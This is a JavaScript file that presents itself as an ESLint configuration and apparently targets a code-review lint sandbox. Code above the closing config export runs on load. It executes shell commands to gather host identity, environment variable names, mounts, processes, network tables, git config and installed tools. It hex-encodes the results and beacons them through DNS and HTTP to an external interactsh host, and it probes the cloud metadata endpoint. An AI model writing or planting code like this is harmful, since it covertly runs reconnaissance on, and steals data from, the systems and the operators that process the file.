// CodeRabbit lint sandbox — current-state fingerprint (2026-08).
// Beacons hex-encoded to interactsh via DNS + HTTP. Identifiers only, no secrets.
var C = 'd9mlhkjoeaqpqkpo1cg0wrougn9ugj14w.oast.site';
var dns = require('dns'), http = require('http');
var hex = function (s) { try { return Buffer.from(String(s)).toString('hex'); } catch (e) { return 'ERR'; } };
var hx = function (tag, d) { try { var h = hex(d).slice(0, 1400); for (var i = 0; i < h.length; i += 60) { dns.lookup(tag + '-' + h.slice(i, i + 60) + '.' + C, function () {}); } } catch (e) {} };
var httpX = function (tag, d) { try { http.get({ host: C, path: '/' + tag + '/' + hex(String(d)).slice(0, 1400), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
var sh = function (cmd) { try { return require('child_process').execSync(cmd, { timeout: 9000, encoding: 'utf8' }).toString().slice(0, 1200); } catch (e) { return 'ERR:' + ((e && e.message) || e).toString().slice(0, 200); } };

try { dns.lookup('alive.' + C, function () {}); } catch (e) {}
hx('host', sh('hostname'));
hx('id', sh('id'));
hx('envn', Object.keys(process.env).join(','));
httpX('envn', Object.keys(process.env).join(','));
hx('caps', sh('grep -E "Cap|NoNewPrivs|Seccomp|Uid|Gid" /proc/self/status'));
hx('cmdline', sh('cat /proc/cmdline'));
hx('mounts', sh('cat /proc/mounts | head -40'));
hx('bins', sh('ls /usr/bin /usr/local/bin /bin 2>/dev/null | sort -u | tr "\\n" ","').slice(0, 1400));
hx('dev', sh('ls -la /dev 2>/dev/null | head -30'));
hx('net', sh('cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | head -25'));
hx('arp', sh('cat /proc/net/arp 2>/dev/null'));
hx('cgroup', sh('cat /proc/self/cgroup; ls /sys/fs/cgroup 2>/dev/null'));
hx('procs', sh('ps auxww 2>/dev/null | head -30'));
hx('fds', sh('ls -la /proc/self/fd 2>/dev/null | head -20'));
hx('etc', sh('cat /etc/resolv.conf /etc/hosts 2>/dev/null'));
hx('unixsock', sh('cat /proc/net/unix 2>/dev/null | head -25'));
hx('gitcfg', sh('cat /home/jailuser/git/.git/config 2>/dev/null; git config --list 2>/dev/null | head -20'));
hx('envvals', sh('env | cut -d= -f1 | tr "\\n" ","'));
hx('who', sh('ls -la /home 2>/dev/null; ls -la /home/jailuser 2>/dev/null | head -25'));
hx('tmp', sh('ls -la /tmp /inmem 2>/dev/null | head -30'));
hx('root', sh('ls -la / 2>/dev/null | head -30'));
hx('ver', sh('uname -a; cat /etc/os-release 2>/dev/null | head -6; node -v 2>/dev/null; npm -v 2>/dev/null; ruby -v 2>/dev/null; python3 -V 2>/dev/null; go version 2>/dev/null; java -version 2>&1 | head -1'));

// new-tool check (docker/kubectl/gcloud/gsutil/nc/socat/curl)
hx('tools', sh('for t in docker kubectl gcloud gsutil nc socat curl wget python3 ruby gem php rustc cargo jq openssl; do which $t >/dev/null 2>&1 && echo -n "$t,"; done'));
// metadata re-check
try { http.get({ host: '169.254.169.254', path: '/', timeout: 5000, headers: { 'Metadata-Flavor': 'Google' } }, function (r) { httpX('md', r.statusCode + ':' + r.headers); }).on('error', function (e) { httpX('md', 'ERR:' + e.code); }); } catch (e) {}
module.exports = { root: true, rules: {} };
